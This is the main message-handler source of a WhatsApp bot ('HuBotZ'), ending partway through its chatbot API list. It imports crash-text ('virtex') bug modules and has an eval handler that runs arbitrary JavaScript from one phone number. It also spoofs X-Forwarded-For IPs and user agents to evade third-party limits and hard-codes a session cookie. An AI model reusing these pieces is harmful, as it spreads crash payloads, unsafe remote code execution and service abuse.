/*
    Original Base From https://github.com/zeeoneofficial/example-case
    
    Full Recode By David XD, And Additional Lots of Features
    
    Don't delete the credits!
    Or I'll Encrypt the Script!
    
Thanks to:
=> My God
=> My Parents
=> Modules Provider
=> Zeeone OFFC
=> Miftah (Rest API)
=> Ibeng (Rest API)
=> Lenttobs (Rest API)
=> Iky (Rest API)
=> Aemt (Rest API)
=> Tofik Md (My Friend)
=> My Inspiration (Iky, Lenttobs and Bochilteam)
=> And Bot Users

That's all from Me And See you :)
*/

const { 
BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
downloadContentFromMessage,
areJidsSameUser, 
getContentType,
delay
} = require('@whiskeysockets/baileys')

require("./settings");
const fs = require('fs')
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const translate = require("@vitalets/google-translate-api");
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const cheerio = require('cheerio')
const cookie = require('cookie')
const path = require('path')
const { Configuration, OpenAIApi } = require('openai');
const os = require('os')
const toMS = require("ms");
const ms = require("parse-ms");
const nou = require("node-os-utils");
const kotz = require("kotz-api");
const instagramGetUrl = require("instagram-url-direct");
const gtts = require('node-gtts')
const bochil = require("@bochilteam/scraper");
const hxz = require("hxz-api");
const yts = require ("yt-search");
const FormData = require("form-data");
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const syntaxerror = require("syntax-error")
const { performance } = require('perf_hooks')
const { sizeFormatter } = require("human-readable");
const canvafy = require("canvafy");

const similarity = require('similarity')
const threshold = 0.72

let format = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});
var dbs = []
global.dbc = dbs

const _prem = require("./lib/premium");
const _sewa = require("./lib/sewa");
const { getRegisteredRandomId, addRegisteredUser, delRegisteredUser, createSerial, checkRegisteredUser, checkSerialUser } = require("./database/register");
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { addRespons, checkRespons, deleteRespons } = require('./lib/respon');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
const { isSetOpen, addSetOpen, removeSetOpen, changeSetOpen, getTextSetOpen } = require("./lib/setopen");
const { isSetClose, addSetClose, removeSetClose, changeSetClose, getTextSetClose } = require("./lib/setclose");
const { casinoSave, setCasino, deleteCasino } = require("./lib/casino");
const { msgFilter, isFiltered, addFilter, ResetSpam, addSpam } = require('./lib/antispam');
const { generateProfilePicture, removeEmojis, smsg, tanggal, formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { yta, ytv } = require('./lib/y2mate')
const { goLens } = require("./lib/googlens");
const { topUp } = require("./lib/duniagames");
const { TelegraPh, UploadFileUgu, Pomf } = require('./lib/uploader')
const { pinterest } = require('./lib/scraper')
const { TelegraPH } = require("./lib/TelegraPH")
const { remini } = require('./lib/remini')
const { virtexnya } = require("./bug/virtex")
const { ngazap } = require ('./bug/ngazap')
const { virtex } = require ('./bug/virtex')
const ffstalk = require('./lib/ffstalk')
const mlstalk = require('./lib/mlstalk')
const { color, bgcolor } = require('./lib/color')
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const afk = require("./lib/afk");
const anon = require('./lib/menfess');
const scp1 = require('./scrape/scraper');
const textpro = require('./scrape/textpro');
const photooxy = require('./scrape/photooxy');
const { canLevelUp, xpRange } = require("./lib/levelling");
const { levelup } = require("./lib/canvas");
const { jadibot, conns } = require('./lib/jadibot')

// Database
let owner = JSON.parse(fs.readFileSync('./database/owner_database/owner.json'));
let mods = JSON.parse(fs.readFileSync('./database/owner_database/mods.json'));
let banchat = JSON.parse(fs.readFileSync('./database/ban_database/banchat.json'));
let stiker = JSON.parse(fs.readFileSync('./database/stik.json'))
let audionya = JSON.parse(fs.readFileSync('./database/vn.json'))
let imagenya = JSON.parse(fs.readFileSync('./database/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/video.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
let set_open = JSON.parse(fs.readFileSync('./database/set_open.json'));
let set_close = JSON.parse(fs.readFileSync('./database/set_close.json'));
let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let opengc = JSON.parse(fs.readFileSync('./database/opengc.json'));
let closegc = JSON.parse(fs.readFileSync('./database/closegc.json'));
let _nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let users = JSON.parse(fs.readFileSync('./database/user.json'));
let mess = JSON.parse(fs.readFileSync('./mess.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let kickme = JSON.parse(fs.readFileSync('./database/kickme.json'));
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let antilink2 = JSON.parse(fs.readFileSync('./database/antilink2.json'));
let antiwame2 = JSON.parse(fs.readFileSync('./database/antiwame2.json'));
let listCmd = JSON.parse(fs.readFileSync('./database/listcmd.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let modsNumber = JSON.parse(fs.readFileSync('./database/modsNumber.json'));
let responDB = JSON.parse(fs.readFileSync('./database/respon.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let openaipc = JSON.parse(fs.readFileSync('./database/openaipc.json'));
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'));
let autotiktok = JSON.parse(fs.readFileSync('./database/auto_download/autodowntiktok.json'))
let autoyt = JSON.parse(fs.readFileSync('./database/auto_download/autodownyt.json'))
let autofb = JSON.parse(fs.readFileSync('./database/auto_download/autodownfb.json'))
let autoig = JSON.parse(fs.readFileSync('./database/auto_download/autodownig.json'))

const enter = '\n'
const petik = '```'

// DB Game
let tictactoe = [];
let kuis = []
let akinator = []
const kuismath = {}
const _family100 = {}
const tebakgambar = {}
const tebakgame = {}
const tebakkata = {}
const tebakbendera = {}
const siapaaku = {}
const tebakkalimat = {}
const caklontong = {}
const susunkata = {}
const tekateki = {}
const tebakkabupaten = {}
const tebakkimia = {}
const tebaklirik = {}
const tebaktebakan = {}

// DB Anti Spam
let yang_spam = []

// Bandwidth
async function checkBandwidth() {
let ind = 0;
let out = 0;
for (let i of await require("node-os-utils").netstat.stats()) {
ind += parseInt(i.inputBytes);
out += parseInt(i.outputBytes);
}
return {
download: format(ind),
upload: format(out),
};
}

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = HuBotZ = async( HuBotZ, m, chatUpdate, mek, store, isSetWelcome, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft, _welcome, _left, antidelete, antionce ) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") HuBotZ.ev.emit("message.delete", m.message.protocolMessage.key);
const botNumber = await HuBotZ.decodeJid(HuBotZ.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMods = [isCreator, ...mods].map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
//const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
//const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : ''
const isCmd = body.startsWith(prefix)
//const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
//const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
//const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const from = m.key.remoteJid
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const senderNumber = m.sender.split('@')[0]
const isEval = body.startsWith('=>');

//Evaled
		if (isEval && senderNumber == "6281383141734") {
			let evaled,
				text = q,
				{ inspect } = require('util');
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== 'string') evaled = inspect(evaled);
				await HuBotZ.sendMessage(m.chat, { text: evaled }, { quoted: m });
			} catch (e) {
				HuBotZ.sendMessage(m.chat, { text: String(e) }, { quoted: m });
			}
		}
//TIME
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam = moment().format("HH:mm:ss z")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'Morning' ? dt : dt == 'Afternoon' ? dt : dt == 'Afternoon' ? dt : dt == 'Night' ? dt : dt == 'Midnight' ? dt : dt == 'Early days' ? dt : dt
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
 if (time2 < "23:59:00") {
var waktunya = `Night 🌃`
 }
 if (time2 < "19:00:00") {
var waktunya = `Evening 🌇`
 }
 if(time2 < "18:00:00") {
var waktunya = `Afternoon 🌆`
 }
 if (time2 < "15:00:00") {
var waktunya = `Afternoon 🌅`
 }
 if (time2 < "11:00:00") {
var waktunya =  `Morning 🌄`
 }
 if (time2 < "05:00:00") {
var waktunya = `Dawn 🌆`
 } 
 if (time2 < "03:00:00") {
var waktunya = `Midnight 🌃`
 }

// Group
const groupMetadata = m.isGroup ? await HuBotZ.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isUser = users.includes(m.sender)
const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender, premium)
const isRegistered = checkRegisteredUser(m.sender)
const isSewa = _sewa.checkSewaGroup(m.chat, sewa)
const isKickMe = kickme.includes(m.chat) ? true : false
const isMute = mute.includes(m.chat) ? true : false
const isAntiLink = antilink.includes(m.chat) ? true : false
const isAntiLink2 = antilink2.includes(m.chat) ? true : false
const isAntidelete = antidelete.includes(m.chat) ? true : false
const isAntionce = antionce.includes(m.chat) ? true : false
const isAutoAiGc = openaigc.includes(m.chat) ? true : false
const isAutoAiPc = openaipc.includes(botNumber) ? true : false
const isAutoDownTT = autotiktok.includes(botNumber) ? true : false
const isAutoDownYt = autoyt.includes(botNumber) ? true : false
const isAutoDownFb = autofb.includes(botNumber) ? true : false
const isAutoDownIG = autoig.includes(botNumber) ? true : false
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const isNsfw = _nsfw.includes(m.chat) ? true : false
const isBanchat = banchat.includes(m.chat) ? true : false

const isAntiWame = antiwame.includes(m.chat) ? true : false
const isAntiWame2 = antiwame2.includes(m.chat) ? true : false
const gcounti = global.limitgameawal
const gcount = isPremium ? global.limitgameawal.premium : global.limitgameawal.free
let timestamp = speed();
let latensi = speed() - timestamp
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `6285600793871-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': global.thumb, thumbnail: global.thumb,sendEphemeral: true}}}
const fkontaku = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': global.thumb, thumbnail: global.thumb,sendEphemeral: true}}}
const fbot = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `*HuBotZ MD*`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': global.thumb, thumbnail: global.thumb,sendEphemeral: true}}}
dbs.push({id: m.key.id, m}); 

//Owner
let list = []
for (let i of owner) {
list.push({
displayName: await HuBotZ.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await HuBotZ.getName(i + '@s.whatsapp.net')}\nFN:${await HuBotZ.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:davidricardo041107@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://bit.ly/420u6GX\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
})
}

//Mods
let listmods = []
for (let ii of mods) {
listmods.push({
displayName: await HuBotZ.getName(ii + '@s.whatsapp.net')
})
}

const ments = (text) => {return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []}

//Function Polling
HuBotZ.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
HuBotZ.sendteks = async(chatId, text = '', quoted = '', opts = {}) => {
return HuBotZ.sendMessage(chatId, { text: text, mentions: await HuBotZ.ments(text), ...opts}, {quoted:quoted})
};
HuBotZ.sendPoll = (jid, name = '', values = [], selectableCount = global.select) => {
return HuBotZ.sendMessage(jid, {poll: { name, values, selectableCount }})
};

//Tambahan :v
const totalFitur = () =>{
            var mytext = fs.readFileSync("./HuBotZ.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
// RESPON CMD POLL MESSAGE THE JO BOT
async function getMessage(key){
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id)
return msg?.message
}
return {conversation: '*HuBotZ MD*'}
}

HuBotZ.ev.on('messages.update', async(chatUpdate) => {
for (const { key, update } of chatUpdate) {
if (update.pollUpdates && key.fromMe) {
const pollCreation = await getMessage(key)
if (pollCreation) {
const pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
const command = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
if (command == undefined) return
const comand = global.prefix+command
console.log(comand)
HuBotZ.appenTextMessage(comand, chatUpdate)
}
}
}
})
const nebal = (angka) => {
return Math.floor(angka)
}

function hitungmundur(tanggal, bulan, tahun){
let from = new Date(`${bulan} ${tanggal}, ${tahun} 00:00:00`).getTime();
let now = Date.now();
let distance = from - now;
let days = Math.floor(distance / (1000 * 60 * 60 * 24));
let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
let seconds = Math.floor((distance % (1000 * 60)) / 1000);
return days + ' Hari ' + hours + ' Jam ' + minutes + ' Menit ' + seconds + ' Detik'
}

function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
        seconds = Math.floor((duration / 1000) % 60),
        minutes = Math.floor((duration / (1000 * 60)) % 60),
        hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

    return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function clockString(ms) {
let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " hari, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " jam, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " menit, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " detik") : "";
let time = d > 0 ? dDisplay + hDisplay + mDisplay + sDisplay : hDisplay + mDisplay + sDisplay
return time
}

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function artinama(value) {
    return new Promise((resolve, reject) => {
        axios.get('https://primbon.com/arti_nama.php?nama1='+value+'&proses=+Submit%21+')
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let fetchText = $('#body').text()
            let hasil
            try {
                hasil = {
                    status: true,
                    message: {
                        nama: value,
                        arti: fetchText.split('memiliki arti: ')[1].split('Nama:')[0].trim(),
                        catatan: 'Gunakan juga aplikasi numerologi Kecocokan Nama, untuk melihat sejauh mana keselarasan nama anda dengan diri anda.'
                    }
                }
            } catch {
                hasil = {
                    status: false,
                    message: `Tidak ditemukan arti nama "${value}" Cari dengan kata kunci yang lain.`
                }
            }
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
return new Promise((resolve, reject) => {
axios.get('https://dumpor.com/v/'+Username, {
headers: {
"cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}
}).then(res => {
const $ = cheerio.load(res.data)
const result = {
profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
}
resolve(result)
})
})
}

async function getGcName(groupID) {
try {
let data_name = await HuBotZ.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return '-'
}
}

async function generateVoice(Locale = "id-ID", Voice = "id-ID-ArdiNeural", Query) {
    const formData = new FormData();
    formData.append("locale", Locale);
    formData.append("content", `<voice name="${Voice}">${Query}</voice>`);
    formData.append("ip", '46.161.194.33');
    const response = await fetch('https://app.micmonster.com/restapi/create', {
        method: 'POST',
        body: formData
    });
    return Buffer.from(('data:audio/mpeg;base64,' + await response.text()).split(',')[1], 'base64');
};

async function generateImage(params) {
    const generate = await prodia.generateImage(params);

    while (generate.status !== "succeeded" && generate.status !== "failed") {
        await new Promise((resolve) => setTimeout(resolve, 250));

        const job = await prodia.getJob(generate.job);

        if (job.status === "succeeded") {
            return job;
        }
    }
}

async function createOtpCanvas(avatar) {
    const codetext = Array.from({ length: 4 }, generateRandomCharacter).join('');
    const captchaBuffer = await new canvafy.Captcha()
        .setBackground("image", "https://cdn.discordapp.com/attachments/1087030211813593190/1110243947311288530/beeautiful-sunset-illustration-1212023.webp")
        .setCaptchaKey(codetext.toString())
        .setBorder("#f0f0f0")
        .setOverlayOpacity(0.7)
        .build();
    const securityBuffer = await new canvafy.Security()
        .setAvatar(avatar)
        .setBackground("image", "https://cdn.discordapp.com/attachments/1087030211813593190/1110243947311288530/beeautiful-sunset-illustration-1212023.webp")
        .setCreatedTimestamp(Date.now())
        .setSuspectTimestamp(1)
        .setBorder("#f0f0f0")
        .setLocale("id") // country short code - default "en"
        .setAvatarBorder("#f0f0f0")
        .setOverlayOpacity(0.9)
        .build();
    return {
        image: captchaBuffer,
        otp: codetext,
        verified: securityBuffer
    };
}

function getParts(array, index) {
    if (isNaN(index)) {
        index = Number(index);
        if (isNaN(index)) {
            return "Indeks harus berupa nomor";
        }
    }

    const text = array[index - 1];
    const language = getLanguage(text);
    return {
        short: language,
        long: text
    };
}

function getLanguage(text) {
    const parts = text.split("-");
    return parts.slice(0, 2).join("-");
}

function ListVoiceArray(array) {
    const modifiedArray = array.map(item => {
        const modifiedName = item.replace(/(.+)-(.+)-(.+)Neural/, "$3 ($1-$2)");
        const language = item.split('-')[0];
        return `${modifiedName} ( ${language} )`;
    });

    return modifiedArray;
}

function ranNumb(min, max = null) {
	if (max !== null) {
		min = Math.ceil(min);
		max = Math.floor(max);
		return Math.floor(Math.random() * (max - min + 1)) + min;
	} else {
		return Math.floor(Math.random() * min) + 1
	}
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}

function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
	return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}

function generateRandomCharacter() {
    const characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    return characters[Math.floor(Math.random() * characters.length)];
}

function generateRandomUserAgent() {
    const androidVersions = ['4.0.3', '4.1.1', '4.2.2', '4.3', '4.4', '5.0.2', '5.1', '6.0', '7.0', '8.0', '9.0', '10.0', '11.0'];
    const deviceModels = ['M2004J19C', 'S2020X3', 'Xiaomi4S', 'RedmiNote9', 'SamsungS21', 'GooglePixel5'];
    const buildVersions = ['RP1A.200720.011', 'RP1A.210505.003', 'RP1A.210812.016', 'QKQ1.200114.002', 'RQ2A.210505.003'];

    const selectedModel = deviceModels[Math.floor(Math.random() * deviceModels.length)];
    const selectedBuild = buildVersions[Math.floor(Math.random() * buildVersions.length)];
    const chromeVersion = 'Chrome/' + (Math.floor(Math.random() * 80) + 1) + '.' + (Math.floor(Math.random() * 999) + 1) + '.' + (Math.floor(Math.random() * 9999) + 1);

    const userAgent = `Mozilla/5.0 (Linux; Android ${androidVersions[Math.floor(Math.random() * androidVersions.length)]}; ${selectedModel} Build/${selectedBuild}) AppleWebKit/537.36 (KHTML, like Gecko) ${chromeVersion} Mobile Safari/537.36 WhatsApp/1.${Math.floor(Math.random() * 9) + 1}.${Math.floor(Math.random() * 9) + 1}`;

    return userAgent;
}

function generateRandomIP() {
    const octet = () => Math.floor(Math.random() * 256);
    return `${octet()}.${octet()}.${octet()}.${octet()}`;
}

async function fetchChatData(type, message) {
    try {
        const headers = {
            'User-Agent': generateRandomUserAgent(),
            'Referer': 'https://talkai.info/id/chat/',
            'X-Forwarded-For': generateRandomIP(),
        };

        const data = {
            temperature: 1,
            frequency_penalty: 0,
            type: type,
            messagesHistory: [{
                    from: 'chatGPT',
                    content: 'You are a helpful assistant.'
                },
                {
                    from: 'you',
                    content: message
                },
            ],
            message: message,
        };

        const response = await axios.post('https://talkai.info/id/chat/send2/', data, {
            headers
        });

        return response.data;
    } catch (error) {
        console.error('Terjadi kesalahan:', error);
    }
}

async function chatgpt(input) {
    if (!input) {
        return {
            status: false,
            message: "No input.",
            contoh: "Halo"
        };
    }

    const result = {
        status: true,
        result: "",
    };

    const apiEndpoints = [{
            url: "https://api-fgmods.ddns.net/api/info/openai2",
            processResponse: (data) => {
                if (data.result !== 'error' && data.result !== '' && data.result !== undefined) {
                    return data.result;
                }
                return null;
            }
        },
        {
            url: "https://vihangayt.me/tools/chatgpt?q=",
            processResponse: (data) => {
                if (data.data !== 'error' && data.data !== '' && data.data !== undefined) {
                    return data.data;
                }
                return null;
            }
        },
        {
            url: "https://vihangayt.me/tools/chatgpt2?q=",
            processResponse: (data) => {
                if (data.data !== 'error' && data.data !== '' && data.data !== undefined) {
                    return data.data;
                }
                return null;
            }
        },
        {
